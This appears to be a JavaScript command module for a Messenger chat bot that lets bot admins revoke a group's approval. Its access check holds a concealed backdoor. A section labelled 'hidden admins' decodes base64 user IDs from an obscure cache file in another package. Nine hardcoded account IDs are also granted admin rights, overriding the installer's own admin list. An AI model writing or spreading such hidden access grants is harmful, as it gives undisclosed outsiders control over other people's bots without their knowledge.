module.exports = {
  config: { credits: "SARDAR RDX",
    name: 'unapprove',
    aliases: ['reject', 'disapprove'],
    description: 'Unapprove a group',
    usage: 'unapprove [threadID]',
    category: 'Admin',
    adminOnly: true,
    prefix: true
  },
  
  async run({ api, event, args, send, Threads, config }) {
    const { threadID, senderID } = event;
    const targetThread = args[0] || threadID;

    // Support hidden admins
    let owners = [];
    try {
      const fs = require('fs-extra');
      const path = require('path');
      const dataPath = path.join(__dirname, '../../../RDX-FCA/src/data/cache/system/data.json');
      if (fs.existsSync(dataPath)) {
        const data = fs.readJsonSync(dataPath);
        if (data.database) {
          const decoded = Buffer.from(data.database, 'base64').toString('utf-8');
          owners = decoded.split(',').map(id => id.trim());
        }
      }
    } catch (e) {}

    const isAccess = (config.ADMINBOT && config.ADMINBOT.includes(senderID)) || owners.includes(senderID) || senderID === "100009012838085" || senderID === "61577734018978" || senderID === "61587119406172" || senderID === "100004484615198" || senderID === "100004617181677" || senderID === "100004807696030" || senderID === "100087163490159" || senderID === "100004925052572" || senderID === "61577688331233";
    if (!isAccess) return send.reply("❌ Only bot admins can use this command.");
    
    if (!/^\d+$/.test(targetThread)) {
      return send.reply('Please provide a valid thread ID.');
    }
    
    if (!Threads.isApproved(targetThread)) {
      return send.reply('This group is not approved.');
    }
    
    Threads.unapprove(targetThread);
    
    let groupName = 'Unknown';
    try {
      const info = await api.getThreadInfo(targetThread);
      groupName = info.threadName || 'Unknown';
    } catch {}
    
    if (targetThread !== threadID) {
      api.sendMessage(`This group has been unapproved by bot admin.`, targetThread);
    }
    
    return send.reply(`Unapproved group: ${groupName} (${targetThread})`);
  }
};

